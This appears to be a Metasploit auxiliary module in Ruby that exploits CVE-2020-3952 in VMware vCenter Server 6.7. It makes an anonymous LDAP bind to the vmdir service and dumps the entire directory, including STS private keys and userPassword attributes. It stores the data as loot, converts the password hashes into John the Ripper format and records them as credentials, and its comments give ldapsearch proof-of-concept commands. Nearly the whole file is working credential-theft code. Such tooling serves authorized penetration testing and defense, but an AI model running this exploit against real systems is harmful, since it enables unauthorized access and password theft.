##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Server vmdir Information Disclosure',
        'Description' => %q{
          This module uses an anonymous-bind LDAP connection to dump data from
          the vmdir service in VMware vCenter Server version 6.7 prior to the
          6.7U3f update, only if upgraded from a previous release line, such as
          6.0 or 6.5.
        },
        'Author' => [
          'Hynek Petrak', # Discovery, hash dumping
          'wvu' # Module
        ],
        'References' => [
          ['CVE', '2020-3952'],
          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
        ],
        'DisclosureDate' => '2020-04-09', # Vendor advisory
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Dump', { 'Description' => 'Dump all LDAP data' }]
        ],
        'DefaultAction' => 'Dump',
        'DefaultOptions' => {
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(636), # SSL/TLS
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it'])
    ])
  end

  def base_dn
    @base_dn ||= 'dc=vsphere,dc=local'
  end

  def policy_dn
    "cn=password and lockout policy,#{base_dn}"
  end

  # PoC using ldapsearch(1):
  #
  # Retrieve root DSE with base DN:
  #   ldapsearch -xb "" -s base -H ldap://[redacted]
  #
  # Dump data using discovered base DN:
  #   ldapsearch -xb dc=vsphere,dc=local -H ldap://[redacted] \* + -
  def run
    entries = nil

    ldap_connect do |ldap|
      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = discover_base_dn(ldap))
          print_warning('Falling back on default base DN dc=vsphere,dc=local')
        end
      end

      print_status("Dumping LDAP data from vmdir service at #{peer}")

      # A "-" meta-attribute will dump userPassword (hat tip Hynek)
      # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/ldap-head/result.c#L647-L654
      entries = ldap.search(base: base_dn, attributes: %w[* + -])
    end

    # Look for an entry with a non-empty vmwSTSPrivateKey attribute
    unless entries&.find { |entry| entry[:vmwstsprivatekey].any? }
      print_error("#{peer} is NOT vulnerable to CVE-2020-3952")
      return Exploit::CheckCode::Safe
    end

    print_good("#{peer} is vulnerable to CVE-2020-3952")
    pillage(entries)

    # HACK: Stash discovered base DN in CheckCode reason
    Exploit::CheckCode::Vulnerable(base_dn)
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
    Exploit::CheckCode::Unknown
  end

  def pillage(entries)
    # TODO: Make this more efficient?
    ldif = entries.map(&:to_ldif).map { |s| s.force_encoding('utf-8') }.join("\n")

    print_status('Storing LDAP data in loot')

    ldif_filename = store_loot(
      name, # ltype
      'text/plain', # ctype
      rhost, # host
      ldif, # data
      nil, # filename
      "Base DN: #{base_dn}" # info
    )

    unless ldif_filename
      print_error('Could not store LDAP data in loot')
      return
    end

    print_good("Saved LDAP data to #{ldif_filename}")

    if (policy = entries.find { |entry| entry.dn == policy_dn })
      print_status('Password and lockout policy:')
      print_line(policy.to_ldif[/^vmwpassword.*/m])
    end

    # Process entries with a non-empty userPassword attribute
    process_hashes(entries.select { |entry| entry[:userpassword].any? })
  end

  def process_hashes(entries)
    if entries.empty?
      print_status('No password hashes found')
      return
    end

    service_details = {
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: 'vmdir/ldap'
    }

    entries.each do |entry|
      # This is the "username"
      dn = entry.dn

      # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/middle-layer/password.c#L32-L76
      type, hash, salt = entry[:userpassword].first.unpack('CH128H32')

      case type
      when 1
        unless hash.length == 128
          vprint_error("Type #{type} hash length is not 128 digits (#{dn})")
          next
        end

        unless salt.length == 32
          vprint_error("Type #{type} salt length is not 32 digits (#{dn})")
          next
        end

        # https://github.com/magnumripper/JohnTheRipper/blob/2778d2e9df4aa852d0bc4bfbb7b7f3dde2935b0c/doc/DYNAMIC#L197
        john_hash = "$dynamic_82$#{hash}$HEX$#{salt}"
      else
        vprint_error("Hash type #{type.inspect} is not supported yet (#{dn})")
        next
      end

      print_good("Credentials found: #{dn}:#{john_hash}")

      create_credential(service_details.merge(
        username: dn,
        private_data: john_hash,
        private_type: :nonreplayable_hash,
        jtr_format: identify_hash(john_hash)
      ))
    end
  end

end
